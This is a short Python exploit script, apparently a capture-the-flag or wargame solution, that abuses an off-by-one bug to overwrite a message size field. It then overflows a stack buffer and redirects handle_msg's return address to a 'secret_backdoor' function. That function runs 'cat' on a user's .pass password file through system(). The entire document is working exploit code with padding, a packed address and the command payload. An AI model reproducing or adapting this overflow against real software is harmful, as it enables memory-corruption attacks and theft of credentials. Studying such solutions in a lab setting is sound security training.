import struct
# while (i <= 0x28 && b[i])
# is off by one so it overwrites the size.
# strncpy(info->msg, b, info->size);
# then use the strncpy to copy the addr of
# secret_backdoor to the handle_msg's return.

# len(in2) = 0xd0
padd = 'a'*0x28
in1 = padd + '\xd0' + '\n'

# The fgets in secret_backdoor will fail and return null.
# So we will be reusing the same chars we wrote to the stack in the handle_msg
# function as an argument to the system function.

# First padd 0x48 because the diff between
# handle_msg 0xc0 and secret_backddor 0x80 is 0x40
# plus 8 because we don't add a new return pointer to the stack.
padd1 = 'a'*0x48
# Then add the string that will be (rbp-0x80) passed
# to the system function.
system = 'cat /home/users/end/.pass '
# handl_msg sub rsp,0xc0
padd2 = 'b'*(0xc0 - len(padd) + 8)
secret_backdoor_addr = struct.pack("<q", 0x000055555555488c)
in2 = padd1 + system + padd2 + secret_backdoor_addr

print in1 + in2
